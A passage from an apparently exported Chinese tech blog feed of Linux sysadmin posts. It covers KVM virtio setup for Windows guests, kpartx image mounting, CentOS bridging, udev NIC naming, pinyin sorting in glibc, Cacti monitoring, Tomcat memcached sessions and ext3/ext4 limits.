7大约需要40分钟。下面开始以下后面的工作，会涉及更多的参数。</p><p>配置硬盘和网络的virtio模式，virtio是个半虚拟化的模式，速度比传统方式还要快些，根据Using virtio_net For The Guest NIC一文的测试，virtio还是很有优势的。</p><p>在虚拟机里面下载virtio windows guest驱动： Storage driver和Network driver，其中已经包含了xp、win7等的驱动。</p><p>根据boot from virtio block device一文的介绍，用以下方式进行安装驱动。</p><p>建一个临时的磁盘文件：</p><p>qemu-img create -f qcow2 fake.img 1G</p><p>启动虚拟机：</p><p>kvm -drive file=winxp.img,if=ide,boot=on -drive file=fake.img,if=virtio -m 1024 -localtime -net nic,model=virtio -net user -usb -usbdevice tablet</p><p>在启动的虚拟机里，会找到virtio设备，然后安装这两个驱动。安装完毕后，关机。以下面方式重新启动：</p><p>kvm -drive file=winxp.img,if=virtio,boot=on -m 1024 -net nic,model=virtio -net user -usb -usbdevice tablet -soundhw es1370</p><p>下面配置远程桌面对Windows的访问，首先需要在虚拟机的Windows里面开启远程桌面，而且必须给用户加上密码，Windows XP和Windows 7需要是Professional以上版本。然后运行mmc继续配置远程桌面访问参数。</p><p>打开mmc后，“添加/删除管理单元“ -&gt; “添加” -&gt; “组策略对象编辑器” -&gt; “本地计算机”。在里面配置：“计算机配置” -&gt; “管理模板” -&gt; “Windows 组件” -&gt; “终端服务” -&gt; “限制最大颜色深度”，设置为24位，原来默认是16位。</p><p>关机，重新以可以以新的模式后台运行：</p><p>kvm -M pc -drive file=winxp.img,if=virtio,boot=on -localtime -m 1024 -soundhw es1370 -net nic,model=virtio -net user -vnc 127.0.0.1:0 -daemonize -redir tcp:3389::3389 -name WindowsXP -usb -usbdevice tablet</p><p>-vnc 127.0.0.1:0表示以vnc模式运行，-daemonize表示kvm以后台运行，-redir tcp:3389::3389表示将虚拟机的3389端口映射为宿主机的3389端口上，这样rdesktop本机就可以进行远程桌面访问了。如果想实时 查看状态，可以使用vncviewer或者vinagre查看。</p><p>现在可以rdesktop进行访问了，下面是rdesktop的参数：</p><p>rdesktop localhost -u username -p password -f -D -z -P -r sound:local -clipboard</p><p>这里-z参数可以保证鼠标运行速度不缓迟，-f表示全屏。</p><p>虚拟机如何使用USB设备呢，首先要保证用户可以访问USB设备，qemu支持usb设备在虚拟机里面的拔插，在qemu界面里（或者vnc访问的界面里），Ctrl+Alt+2进入qemu monitor命令行控制模式，然后</p><p>usb_add host:vid:pid</p><p>查看usb设备：</p><p>info usb</p><p>Windows 7的运行和访问参数与Windows XP类似。</p><p><a href="http://www.linux-kvm.org/page/Boot\_from\_virtio\_block\_device" target="_blank" rel="noopener">http://www.linux-kvm.org/page/Boot\_from\_virtio\_block\_device</a>   </p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Virtio block device is a para-virtualized device for kvm guest. It is different from normal emulated hard drive, because it is simply faster. This small how-to is about how to make a disk para-virtualized and boot from it.</p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><ol><li>create a disk and install os to it by appending “-hda &lt;your_disk_image&gt;” to your virtual machine</li><li>in your guest os, upgrade kernel to 2.6.25 which contains virtio_* drivers. or ubuntu 8.04 also has it.</li><li>in guest os, change /boot/grub/device.map from “(hd0) /dev/sda” to “(hd0) /dev/vda”</li><li>in guest os, change /boot/grub/menu.list from “root=/dev/sda1” to “root=/dev/vda1”, if you are using UUID, then no need to do this step.</li><li>enable para-virtualization by changing “-hda &lt;your_disk_image” to “-drive file=&lt;your_disk_image&gt;,if=virtio,boot=on”</li></ol><p>note: current debian lenny default kernel (2.6.26-2-amd64) will <strong>not</strong> give any output when running “dmesg | grep virtio”</p><h2 id="Error-18"><a href="#Error-18" class="headerlink" title="Error 18"></a>Error 18</h2><p>you may experience this error while grub is booting. I solved it by making the /boot the first partition and make it 32MB.</p><h2 id="qcow2"><a href="#qcow2" class="headerlink" title="qcow2"></a>qcow2</h2><p>I have problem to boot from qcow2 format image, it will hang while kernel booting. you may convert your disk image to raw format by “qemu-img convert -f qcow2 &lt;your_disk_image&gt; -O raw &lt;a_new_location&gt;”.</p><h2 id="Booting-with-lilo"><a href="#Booting-with-lilo" class="headerlink" title="Booting with lilo"></a>Booting with lilo</h2><p>You must add this to your lilo.conf:</p><p>boot=/dev/vda disk=/dev/vda bios=0x80 max-partitions=7 </p><p>and after your image clausule change:</p><p>root=/dev/vda1 </p><p>where vda1 is your boot partition</p><h2 id="Updating-the-guest-initramfs-with-the-virtio-driver"><a href="#Updating-the-guest-initramfs-with-the-virtio-driver" class="headerlink" title="Updating the guest initramfs with the virtio driver"></a>Updating the guest initramfs with the virtio driver</h2><p>If you are hosting a debian guest then you may want to update its initramfs with the virtio driver as explained in <a href="http://www.linux-kvm.org/page/Using_VirtIO_NIC" title="Using VirtIO NIC" target="_blank" rel="noopener">Using VirtIO NIC</a></p><h1 id="Windows-XP"><a href="#Windows-XP" class="headerlink" title="Windows XP"></a>Windows XP</h1><p>Windows driver installation is a bit tricky.</p><ul><li>In your guest, download the <a href="http://www.linux-kvm.org/page/WindowsGuestDrivers/Download_Drivers" title="WindowsGuestDrivers/Download Drivers" target="_blank" rel="noopener">Windows driver</a></li><li>Stop the machine and create a new image that you will add as a second disk</li></ul><p>kvm-img create -f qcow2 fake.qcow2 1G </p><ul><li>Start the machine. You will be prompted to install the driver. This is enough to allow to boot on the <em>virtio</em> disk</li></ul><p>kvm -drive file=windows.qcow2,if=ide,boot=on -drive file=fake.qcow2,if=<strong>virtio</strong> … </p><ul><li>Restart the m achine, but with the <em>virtio</em> driver on the first disk</li></ul><p>kvm -drive file=windows.qcow2,if=<strong>virtio</strong>,boot=on </p><ul><li>You will be prompted once again to install the driver.</li></ul>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kvm </tag>
            
            <tag> virtio </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kpartx--挂载虚拟机镜像文件里的普通分区</title>
      <link href="/2011/09/07/kpartx-a-common-partition-in-a-virtual-machine-image-file/"/>
      <url>/2011/09/07/kpartx-a-common-partition-in-a-virtual-machine-image-file/</url>
      <content type="html"><![CDATA[<p>用 virt-manager, virsh 或其他工具可以选择把 KVM 或 Xen HVM 的虚拟机安装在一个镜像文件上，虽然因为性能的关系这种方式不推荐在生产环境使用，但是因为用起来非常简便，所以 VPSee 平时做实验或测试的时候会经常用这种方式存储虚拟机。上星期提到了 “<a href="http://www.vpsee.com/2010/10/mount-lvm-volumes-from-loopback-disk-images/" target="_blank" rel="noopener">挂载虚拟机镜像文件里的 LVM 逻辑分区</a>”，那么如何挂载虚拟机镜像文件里的普通分区呢？这比挂载 LVM 逻辑分区要简单多了，不用算那个地址偏移量 offset，也不用 LVM 打交道。</p><p>和以前一样，首先用 losetup 工具把 centos.img 文件和 loop 设备映射起来，-f 参数用来找出下一个可用的 loop 设备：</p><p># losetup -f /dev/loop0  # losetup /dev/loop0 /home/vpsee/centos.img </p><p>一个镜像文件里可能包含多个分区，所以不能简单 mount -o loop centos.img，我们需要把 centos.img 里面包含的每个分区映射出来后在一个一个挂载，所以需要一个工具来读分区表，kpartx 就是这样一个在特定设备上读取分区表并为每个分区创建映射的工具，-a 参数表示加入分区映射；-v 参数表示完成后输出结果：</p><p># kpartx -av /dev/loop0 add map loop0p1 : 0 208782 linear /dev/loop0 63 add map loop0p2 : 0 1044225 linear /dev/loop0 208845 add map loop0p3 : 0 19711755 linear /dev/loop0 1253070 </p><p>上面 loop0p1, loop0p2, loop0p3 分别映射到镜像文件里的3个分区里，可以通过 fdisk 来查看：</p><p># fdisk -l /dev/loop0  Disk /dev/loop0: 10.7 GB, 10737418240 bytes 255 heads, 63 sectors/track, 1305 cylinders Units = cylinders of 16065 <em> 512 = 8225280 bytes        Device Boot      Start         End      Blocks   Id  System /dev/loop0p1   </em>           1          13      104391   83  Linux /dev/loop0p2              14          78      522112+  82  Linux swap / Solaris /dev/loop0p3              79        1305     9855877+  83  Linux </p><p>有了上面的映射以后就可以挂载 centos.img 里的普通逻辑分区了，我们这里只挂载 root 分区，root 分区在 loop0p3，挂载成功后用 ls 查看一下是否正确：</p><p># ls -l /dev/mapper/ total 0 crw——- 1 root root  10, 63 Sep 24 11:34 control brw-r—– 1 root disk 253,  2 Oct 14 19:55 loop0p1 brw-r—– 1 root disk 253,  3 Oct 14 19:55 loop0p2 brw-r—– 1 root disk 253,  4 Oct 14 19:55 loop0p3  # mount /dev/mapper/loop0p3 /mnt # ls /mnt bin   dev  home  lib64       media  opt   root  selinux  sys  usr boot  etc  lib   lost+found  mnt    proc  sbin  srv      tmp  var </p><p>使用完后，需要按顺序干净卸载：</p><p># umount /mnt  # kpartx -dv /dev/loop0 del devmap : loop0p1 del devmap : loop0p2 del devmap : loop0p3  # losetup -d /dev/loop0</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>centos中kvm网桥的设置</title>
      <link href="/2011/09/05/the-setting-of-kvm-bridge-in-centos/"/>
      <url>/2011/09/05/the-setting-of-kvm-bridge-in-centos/</url>
      <content type="html"><![CDATA[<p>新建一个ifcfg－br0文件：</p><p>DEVICE=br0<br>TYPE=Bridge<br>BOOTPROTO=static<br>BROADCAST=10.1.255.255<br>IPADDR=10.1.29.3<br>NETMASK=255.255.0.0<br>NETWORK=10.1.0.0<br>ONBOOT=yes</p><p>然后修改相应网卡的配置文件，我的是eth1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">\# Realtek Semiconductor Co., Ltd. RTL-8169 Gigabit Ethernet  </span><br><span class="line">DEVICE=eth1  </span><br><span class="line">#BOOTPROTO=none  </span><br><span class="line">#BROADCAST=10.1.255.255  </span><br><span class="line">HWADDR=D8:5D:4C:74:EE:E8  </span><br><span class="line">#IPADDR=10.1.29.3  </span><br><span class="line">#NETMASK=255.255.0.0  </span><br><span class="line">#NETWORK=10.1.0.0  </span><br><span class="line">ONBOOT=yes  </span><br><span class="line">#TYPE=Ethernet  </span><br><span class="line">#USERCTL=no  </span><br><span class="line">#IPV6INIT=no  </span><br><span class="line">#PEERDNS=yes  </span><br><span class="line">BRIDGE=br0</span><br></pre></td></tr></table></figure></p><p>可以看出，原来网卡的配置只保留device名称，硬件地址，onboot选项，以及新添加的BRIDGE=br0。</p><p>然后重启网络：</p><p>/etc/init.d/network restart 或service network restart</p><p>实验中在br0中加入gateway后，/etc/sysconfig/network中的gateway就消失了。成功后，利用route -n查看路由，发现所有的包都从br0走了。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>udev关于解决多网卡，防止重启时顺序改变的方案</title>
      <link href="/2011/09/01/udev-s-plan-for-resolving-multiple-network-cards-to-prevent-sequential-changes-from-restarting/"/>
      <url>/2011/09/01/udev-s-plan-for-resolving-multiple-network-cards-to-prevent-sequential-changes-from-restarting/</url>
      <content type="html"><![CDATA[<p>昨天walfred在群里面，看到了一条“关于机器上面有多网卡，并且做了bond，重启之后却乱序了”的问题，提问的是一名叫Daemon的网友，Daemon之前研究过gentoo，现在貌似转战cent os了，这也是他在搞cent os的时候，遇到的问题，walfred之前只听过cent os,却一直没有接触过，这边就借Daemon的问题记载下这个解决方案。并且也希望自己多和Daemon学习cent os的一些使用技巧。</p><p>问题：如标题</p><p>这里稍微补充下：如果你有两张网卡，一个是主板上自带的，还有一个是后来自己添加的。装完系统后，系统默认主板上的网卡为eth1，而自己添加的网卡是eth0，所以想办法使用udev使系统将主板上的网卡命名为eth0。</p><p>解决方案：</p><p>cd /etc/udev/rules.d</p><p>找到60-net.rules，备份该文件</p><p>mv 60-net.rules 60-net.rules.bak</p><p>新建文件60-net.rules，内容如下：</p><p>[root@localhost rules.d]# cat 60-net.rules</p><p>SUBSYSTEM==”net”, ACTION==”add”, SYSFS{address}==”你自己的网卡1的mac地址”,</p><p>IMPORT=”/lib/udev/rename_device %k eth0”</p><p>SUBSYSTEM==”net”, ACTION==”add”, SYSFS{address}==”你自己的网卡2的mac地址”,</p><p>IMPORT=”/lib/udev/rename_device %k eth1”</p><p>其中需要注意的是，你要将你自己的网卡的mac地址做相应的更改。</p><p>重启电脑，一切ok。<br>不重启的话比较麻烦一点，下面介绍一下<br>使用udevinfo 获取网卡物理设备信息<br>udevinfo -a -p /sys/class/net/eth0<br>取消mac等信息<br>然后添加规则如：SUBSYSTEM==”net”,SYSFS{address}==”00:11:5b:d1:0e:f8”,NAME=”lan0”<br>注意：在udev规则文件中必须使用小写的16进制MAC地址，udev无法识别大写的MAC地址（或直接以udevinfo 的输出为准）。<br>如果修改了设备名，需要重新启动udev<br>由于需重命名网络设备，故需停止网络，并卸载网卡驱动模块：<br>ervice network stop;rmmod 8139cp;rmmod 8139too;start_udev;service network start<br>若没有停止网络，而该网卡设备仍在使用中，重启udev 服务时，会报错：<br>Sep  1 15:43:57 ax3sp3 udevd-event[3077]: rename_netif: error changing netif name: Device or resource busy</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>RHEL5.4对中文排序问题</title>
      <link href="/2011/08/30/rhel5-4-for-chinese-sorting-problem/"/>
      <url>/2011/08/30/rhel5-4-for-chinese-sorting-problem/</url>
      <content type="html"><![CDATA[<p>今天德哥发现rhel5.4上使用sort对中文进行拼音排序，而在rhel6中是正常的。现象如下：</p><p>[root@rhel5-2 ~]# locale</p><p>LANG=zh_CN.utf-8</p><p>LC_CTYPE=zh_CN.utf-8</p><p>LC_NUMERIC=”zh_CN.utf-8”</p><p>LC_TIME=”zh_CN.utf-8”</p><p>LC_COLLATE=zh_CN.utf-8</p><p>LC_MONETARY=”zh_CN.utf-8”</p><p>LC_MESSAGES=”zh_CN.utf-8”</p><p>LC_PAPER=”zh_CN.utf-8”</p><p>LC_NAME=”zh_CN.utf-8”</p><p>LC_ADDRESS=”zh_CN.utf-8”</p><p>LC_TELEPHONE=”zh_CN.utf-8”</p><p>LC_MEASUREMENT=”zh_CN.utf-8”</p><p>LC_IDENTIFICATION=”zh_CN.utf-8”</p><p>LC_ALL=</p><p>[root@rhel5-2 ~]# cat test</p><p>中国</p><p>日本</p><p>美国</p><p>上海</p><p>[root@rhel5-2 ~]# sort test</p><p>上海</p><p>中国</p><p>日本</p><p>美国</p><p>[root@rhel5-2 ~]# rpm -qa|grep glibc</p><p>glibc-common-2.5-42</p><p>glibc-devel-2.5-42</p><p>glibc-2.5-42</p><p>glibc-headers-2.5-42</p><p>这其实是因为中文本地化数据并没有包含拼音排序的信息。即glibc中的local数据不包含对中文按拼音和笔画的排序</p><p>官方上bug的提交如下：</p><p><a href="http://sources.redhat.com/ml/glibc-bugs/2007-02/msg00068.html" target="_blank" rel="noopener">http://sources.redhat.com/ml/glibc-bugs/2007-02/msg00068.html</a></p><p><a href="http://sourceware.org/bugzilla/show_bug.cgi?id=4024" target="_blank" rel="noopener">http://sourceware.org/bugzilla/show_bug.cgi?id=4024</a></p><p>现在给出解决方案，如下：</p><p>现在通过安装一种额外的中文本地化数据zh_CN@pinyin就可以让你在UTF-8和GB18030字符集下都可以正确的排序中文。 即locale-pinyin</p><p>介绍</p><p>＝＝</p><p>按拼音排序的中文locale。</p><p>在类Unix中为了能够正确的排序电脑中的中文，你必须有能够正确对中文进行排序</p><p>的locale数据。而glibc包含的locale数据一直没能对中文按照拼音或者笔画排</p><p>序。本软件则是为你在电脑中增加一种按照拼音排序的中文locale。</p><p>安装</p><p>＝＝</p><p>系统需求：</p><p>1、系统需要有符合X/Open标准的localedef工具</p><p>2、5.8.1以上的perl</p><p>安装：</p><p>$make</p><p>#make install</p><p>配置</p><p>＝＝</p><p>为了生效，你必须正确配置locale环境变量。</p><p>推荐仅设置LC_COLLATE为本locale，比如：</p><p>LANG=zh_CN.UTF-8</p><p>LC_COLLATE=zh_<a href="mailto:CN@pinyin.utf8" target="_blank" rel="noopener">CN@pinyin.utf8</a></p><p>注意：不要同时设置LC_ALL和LC_COLLATE，这样可能会导致本locale不能正确生</p><p>效。</p><p>再跟踪glibc，发现官方在比较新的版本中已经把local_pinyin合并进去了(glibc2.6以上)，如下：</p><p><a href="http://sourceware.org/cgi-bin/cvsweb.cgi/libc/localedata/locales/iso14651_t1_pinyin?rev=1.1&amp;content-type=text/x-cvsweb-markup&amp;cvsroot=glibc" target="_blank" rel="noopener">http://sourceware.org/cgi-bin/cvsweb.cgi/libc/localedata/locales/iso14651_t1_pinyin?rev=1.1&amp;content-type=text/x-cvsweb-markup&amp;cvsroot=glibc</a></p><p>升级glibc是一个比较大的工程，涉及也比较广，建议在用rhel5时先打上local_pinyin补丁，或者可以考虑使用rhel6</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>cacti 监控tcp连接数，ipv6问题解决</title>
      <link href="/2011/08/17/cacti-monitors-tcp-connection-number-and-solves-ipv6-problem/"/>
      <url>/2011/08/17/cacti-monitors-tcp-connection-number-and-solves-ipv6-problem/</url>
      <content type="html"><![CDATA[<p>原文为<a href="http://xok.la/2010/04/cacti_netstat_tcp.html" target="_blank" rel="noopener">http://xok.la/2010/04/cacti_netstat_tcp.html</a>，是通过snmpnetstat去拿回来的数据再做处理的，但问题就来了，snmpnetstat 拿到的数据只有ipv4的连接，ipv6的连接全部都没有拿过来。差别还很大。</p><p>google了好久，也查了不少资料，但还是没有解决，最后只好去查看net-snmp的文档，<a href="http://net-snmp.sourceforge.net/docs/" target="_blank" rel="noopener">http://net-snmp.sourceforge.net/docs/</a>查看oid，最后查看可以使用.1.3.6.1.2.1.6.19这一个oid获取到数据，再对数据做统计修改脚本，基本实现了tcp的监控问题。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>共享session,memcached-session-manager</title>
      <link href="/2011/08/17/sharing-session-memcached-session-the-manager/"/>
      <url>/2011/08/17/sharing-session-memcached-session-the-manager/</url>
      <content type="html"><![CDATA[<p>1.memcached-2.5.jar,memcached-session-manager-XXX.jar    </p><p><a href="http://code.google.com/p/memcached-session-manager/" target="_blank" rel="noopener">http://code.google.com/p/memcached-session-manager/</a></p><p><a href="http://code.google.com/p/spymemcached/" target="_blank" rel="noopener">http://code.google.com/p/spymemcached/</a></p><p>将附件中的两个包放入tomcat的lib 目录下</p><p>用新版本的测试还有点问题java.lang.IllegalArgumentException: No node found for key bak，使用原来的1.4的版本正常  </p><ol start="2"><li><p>修改tomcat的server.xml配置（在Host节点之间添加如下配置）：  </p><pre><code>&lt;Context path=&quot;&quot; docBase=&quot;/app/wap/server/sns&quot;&gt;           &lt;Manager className=&quot;de.javakaffee.web.msm.MemcachedBackupSessionManager&quot;           memcachedNodes=&quot;n1:192.168.169.47:11212 n2:192.168.169.47:11213&quot;           failoverNodes=&quot;n2&quot;            sticky=&quot;false&quot;            requestUriIgnorePattern=&quot;.*\\.(png|gif|jpg|css|js)$&quot;           transcoderFactoryClass=&quot;de.javakaffee.web.msm.JavaSerializationTranscoderFactory&quot; /&gt;  &lt;/Context&gt;</code></pre></li></ol>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>(转)ext3/ext4文件系统大分区支持</title>
      <link href="/2011/08/15/ext3-ext4-file-system-large-partition-support/"/>
      <url>/2011/08/15/ext3-ext4-file-system-large-partition-support/</url>
      <content type="html"><![CDATA[<p>很长一段时间以来，ext3是很多linux发行版默认的文件系统，目前ext4已经正式发布，已经有发行版开始使用ext4作为默认的文件系统了，其实最初的时候ext4是作为ext3的扩展，但是为了保证ext3的稳定性等原因，很多人反对直接对ext3进行扩展，所以单独作为了ext4项目。</p><pre><code>ext3还是使用15个inode来查找数据块，前12个为直接数据块，直接指向存储数据的数据块，接下来分别为一级间接块，二级间接块，三级间接块，跟下图一致：  </code></pre><p><img src="http://img.blog.163.com/photo/sKMI40PlO7t27_CM0STucw==/5761792773267886366.jpg" alt="ext3/ext4文件系统大分区支持 - zhuzhu - 五事九思" title="(转)ext3/ext4文件系统大分区支持 - suchalin - 态度决定高度"><br>其中point本来也是数据块，现在拿来做数据块的索引用，其中ext3的头文件定义为： __u32 i_block[EXT3_N_BLOCKS];/<em> Pointers to blocks </em>/，所以可以计算ext3文件系统的极限：<br>最大分区：<br>         因为定义的是无符号32位数，所以可能定位的block范围为2^32，也就是4G，如果一个block大小为4KB，所以为4G <em> 4KB = 16TB<br>最大文件：<br>         前面直接指向12个数据块，一级间接块最大为block size / 4，block size就是数据块的大小，因为一个索引是4个字节，所以除以4，这样计算下来，最大的文件可以使用的总块数为:12 + (block size/4) + (block size/4)^2 + (block size/4)^3，如果block size大小为4K，则为(12 + 2^10 + 2^20 + 2^30) </em> 2^12 约等于4T。</p><pre><code>为了突破ext3这个大小限制，ext4使用了48位的数据块索引空间，同时使用了如下结构代替inode索引的方式：  </code></pre><p>struct ext3_extent {<br>__u32 ee_block; /<em> first logical block extent covers </em>/<br>__u16 ee_len;   /<em> number of blocks covered by extent </em>/<br>__u16 ee_start_hi; /<em> high 16 bits of physical block </em>/<br>__u32 ee_start; /<em> low 32 bigs of physical block </em>/<br>};<br>这样查找数据块的时候就不是每个块建立一个索引，而且使用连续的数据块，也就是分别指示起始位置，以及连续的块数，这样在大文件的时候，磁盘io效率以及查找数据块效率上都有很大的提高，所以ext4的文件系统也比ext3出色。因为使用了48位的索引空间，所以在4KB块大小的情况下，文件系统的极限是2^48 * 4KB = 1EB，不过，目前由于工具的限制，只能使用16TB的分区。</p><p>不过是自己的理解，也欢迎朋友指正。</p><p>硬盘驱动器上的空间划分（或者说分区）为多个分区。分区不能重叠，未分配给分区的空间称为剩余空间。分区名的形式类似于 /dev/hda1、/dev/hda2、/dev/hda3、/dev/sda1 等。在未使用 IDE 驱动器热插拔支持的系统上，IDE 驱动器最多支持 63 个分区。通过热插拔支持的 SCSI 驱动器、USB 驱动器和 IDE 驱动器最多可有 15 个分区。一个分区通常会分配为整数个柱面（柱面概念可能存在不准确之处）。</p><p><a href="http://www.ibm.com/developerworks/cn/linux/l-lpic1-v3-102-1/?S_TACT=105AGX52&amp;S_CMP=tec-ccid" target="_blank" rel="noopener">http://www.ibm.com/developerworks/cn/linux/l-lpic1-v3-102-1/?S_TACT=105AGX52&amp;S_CMP=tec-ccid</a></p><p>EXT3与EXT4的主要区别  </p><p>Linux kernel 自 2.6.28 开始正式支持新的文件系统 Ext4。 Ext4 是 Ext3 的改进版，修改了 Ext3 中部分重要的数据结构，而不仅仅像 Ext3 对 Ext2 那样，只是增加了一个日志功能而已。Ext4 可以提供更佳的性能和可靠性，还有更为丰富的功能：</p><p>1. 与 Ext3 兼容。 执行若干条命令，就能从 Ext3 在线迁移到 Ext4，而无须重新格式化磁盘或重新安装系统。原有 Ext3 数据结构照样保留，Ext4 作用于新数据，当然，整个文件系统因此也就获得了 Ext4 所支持的更大容量。</p><p>2. 更大的文件系统和更大的文件。 较之 Ext3 目前所支持的最大 16TB 文件系统和最大 2TB 文件，Ext4 分别支持 1EB（1,048,576TB， 1EB=1024PB， 1PB=1024TB）的文件系统，以及 16TB 的文件。<br>3. 无限数量的子目录。 Ext3 目前只支持 32,000 个子目录，而 Ext4 支持无限数量的子目录。</p><p>4. Extents。 Ext3 采用间接块映射，当操作大文件时，效率极其低下。比如一个 100MB 大小的文件，在 Ext3 中要建立 25,600 个数据块（每个数据块大小为 4KB）的映射表。而 Ext4 引入了现代文件系统中流行的 extents 概念，每个 extent 为一组连续的数据块，上述文件则表示为“该文件数据保存在接下来的 25,600 个数据块中”，提高了不少效率。</p><p>5. 多块分配。 当 写入数据到 Ext3 文件系统中时，Ext3 的数据块分配器每次只能分配一个 4KB 的块，写一个 100MB 文件就要调用 25,600 次数据块分配器，而 Ext4 的多块分配器“multiblock allocator”（mballoc） 支持一次调用分配多个数据块。</p><p>6. 延迟分配。 Ext3 的数据块分配策略是尽快分配，而 Ext4 和其它现代文件操作系统的策略是尽可能地延迟分配，直到文件在 cache 中写完才开始分配数据块并写入磁盘，这样就能优化整个文件的数据块分配，与前两种特性搭配起来可以显著提升性能。</p><p>7. 快速 fsck。 以前执行 fsck 第一步就会很慢，因为它要检查所有的 inode，现在 Ext4 给每个组的 inode 表中都添加了一份未使用 inode 的列表，今后 fsck Ext4 文件系统就可以跳过它们而只去检查那些在用的 inode 了。</p><p>8. 日志校验。 日志是最常用的部分，也极易导致磁盘硬件故障，而从损坏的日志中恢复数据会导致更多的数据损坏。Ext4 的日志校验功能可以很方便地判断日志数据是否损坏，而且它将 Ext3 的两阶段日志机制合并成一个阶段，在增加安全性的同时提高了性能。</p><p>9. “无日志”（No Journaling）模式。 日志总归有一些开销，Ext4 允许关闭日志，以便某些有特殊需求的用户可以借此提升性能。</p><p>10. 在线碎片整理。 尽管延迟分配、多块分配和 extents 能有效减少文件系统碎片，但碎片还是不可避免会产生。Ext4 支持在线碎片整理，并将提供 e4defrag 工具进行个别文件或整个文件系统的碎片整理。</p><p>11. inode 相关特性。 Ext4 支持更大的 inode，较之 Ext3 默认的 inode 大小 128 字节，Ext4 为了在 inode 中容纳更多的扩展属性（如纳秒时间戳或 inode 版本），默认 inode 大小为 256 字节。Ext4 还支持快速扩展属性（fast extended attributes）和 inode 保留（inodes reservation）。</p><p>12. 持久预分配（Persistent preallocation）。 P2P 软件为了保证下载文件有足够的空间存放，常常会预先创建一个与所下载文件大小相同的空文件，以免未来的数小时或数天之内磁盘空间不足导致下载失败。 Ext4 在文件系统层面实现了持久预分配并提供相应的 API（libc 中的 posix_fallocate()），比应用软件自己实现更有效率。</p><p>13. 默认启用 barrier。 磁 盘上配有内部缓存，以便重新调整批量数据的写操作顺序，优化写入性能，因此文件系统必须在日志数据写入磁盘之后才能写 commit 记录，若 commit 记录写入在先，而日志有可能损坏，那么就会影响数据完整性。Ext4 默认启用 barrier，只有当 barrier 之前的数据全部写入磁盘，才能写 barrier 之后的数据。（可通过 “mount -o barrier=0″ 命令禁用该特性。）</p><p>Ext3 和 ext4 文件系统在线调整大小内幕<br><a href="http://www.ibm.com/developerworks/cn/linux/l-cn-ext4resize/" target="_blank" rel="noopener">http://www.ibm.com/developerworks/cn/linux/l-cn-ext4resize/</a></p><p><a href="http://zauc.wordpress.com/2011/02/11/%E5%88%9D%E6%8E%A2ext4%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/" target="_blank" rel="noopener">http://zauc.wordpress.com/2011/02/11/%E5%88%9D%E6%8E%A2ext4%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</a><br> <img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/img229_ph_2141180147839541743.jpg" alt="ext3/ext4文件系统大分区支持 - zhuzhu - 五事九思" title="(转)ext3/ext4文件系统大分区支持 - suchalin - 态度决定高度">  </p><p>ext4-howto中文<br><a href="http://zauc.wordpress.com/2011/02/18/ext4-howto%E4%B8%AD%E6%96%87/" target="_blank" rel="noopener">http://zauc.wordpress.com/2011/02/18/ext4-howto%E4%B8%AD%E6%96%87/</a><br><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/img687_ph_2824882866269436195.png" alt="ext3/ext4文件系统大分区支持 - zhuzhu - 五事九思" title="(转)ext3/ext4文件系统大分区支持 - suchalin - 态度决定高度">  </p><p>目前网络中充斥着各种Linux文件系统，用户很难在不了解这么多种文件系统的情况下从中做出一个好的并且适合自己选择，下面的内容转自<a href="http://www.linuxeden.com/" target="_blank" rel="noopener">LinuxEden</a>网站，由于年代久远，原文链接已丢失，并且我在其中加入了EXT4的介绍。熟悉文件系统特性并选择一个合适的文件系统有利于充分利用磁盘物理属性。</p><p>1、ext</p><p>ext 是第一个专门为 Linux 的文件系统类型,叫做扩展文件系统。它在 1992 年 4 月完成的。它为 Linux 的发展取得了重要作用。但是在性能和兼容性上存在许多缺陷。现在已经很少使用了。</p><p>2、ext2</p><p>ext2 是为解决 ext 文件系统的缺陷而设计的可扩展的高性能的文件系统。又被称为二级扩展文件系统。它是在 1993 年发布的,设计者是 Rey Card。ext2 是 Linux 文件系统类型中使用最多的格式。并且在速度和 CPU 利用率上较突出,是 GNU/Linux 系统中标准的文件系统,其特点为存取文件的性能极好,对于中小型的文件更显示出优势,这主要得利于其簇快取层的优良设计。2000 年以前几乎所有的 Linux 发行版都用 ext2 作为默认的文件系统。</p><p>3、ext3</p><p>ext3 是由开放资源社区开发的日志文件系统,主要开发人员是 Stephen tweedie。ext3被设计成是 ext2 的升级版本,尽可能地方便用户从 ext2fs 向 ext3fs 迁移。ext3 在 ext2的基础上加入了记录元数据的日志功能,努力保持向前和向后的兼容性。这个文件系统被称为 ext2 的下一个版本。也就是在保有目前 ext2 的格式之下再加上日志功能。ext3 是一种日志式文件系统。日志式文件系统的优越性在于:由于文件系统都有快取层参与运作,如不使用时必须将文件系统卸下,以便将快取层的资料写回磁盘中。因此每当系统要关机时,必须将其所有的文件系统全部卸下后才能进行关机。如果在文件系统尚未卸下前就关机 (如停电) 时,下次重开机后会造成文件系统的资料不一致,故这时必须做文件系统的重整工作,将不一致与错误的地方修复。</p><p>4、ext4</p><p>ext4 是一种针对 ext3 系统的扩展日志式文件系统,是 专 门为 